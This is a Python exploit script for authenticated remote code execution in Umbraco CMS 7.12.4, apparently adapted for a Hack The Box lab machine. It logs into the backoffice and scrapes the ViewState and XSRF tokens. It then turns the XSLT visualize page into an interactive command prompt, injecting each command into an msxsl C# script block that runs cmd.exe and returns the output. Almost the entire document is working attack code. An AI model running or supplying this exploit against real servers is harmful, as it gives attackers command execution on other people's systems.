# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Modified by: crypticsilence 2020-04-10
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# CVE: N/A


import requests;
from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());


login = "admin@htb.local";
password="REDACTED";
host = "http://10.10.10.180";

    
print("Start");


print ('# Step 1 - Get Main page')
s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print(r1.status_code,r1.headers)
#print(r1.text)

print ('# Step 2 - Process Login')
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);
print(r2.status_code,r2.headers)
print_dict(r2.cookies);
#print(r2.text)

print ('\r\n# Step 3 - Go to vulnerable web page')
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);
print(r3.status_code,r3.headers)
#print(r3.text)

#print("WARNING:  backslashes \\ must be escaped \\\\")
print("Type 'quit' to exit")
print()

done = 0
while not done:
  # Read input and run command 
  cmd = raw_input('Cmd:\> ').replace("\\","\\\\")
  if cmd=="quit": 
    done=1
  else: 
    #print(type(cmd))
    payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
    xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
    <msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { \
    string cmd = "cmd.exe"; \
    string args = "/c '+cmd+'"; \
    System.Diagnostics.Process proc = new System.Diagnostics.Process(); \
    proc.StartInfo.FileName = cmd; proc.StartInfo.Arguments = args; \
    proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
    proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
    </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"> \
    </xsl:value-of> </xsl:template> </xsl:stylesheet> ';

    #print('\r\npayload:')
    #print(payload+'\r\n')

    soup = BeautifulSoup(r3.text, 'html.parser');
    VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
    VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
    UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
    headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
    data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

    #print ('# Step 4 - Launch the attack')
    r4 = s.post(url_xslt,data=data,headers=headers);
    print(r4.status_code)
    #print(r4.headers)
    #print(r4.text)
    soup = BeautifulSoup(r4.text, 'html.parser');
    h3 = soup.find_all("div", {"id":"result"})    # print result
    if h3:
      for h in h3:
        print(h.text)

print("End");
            
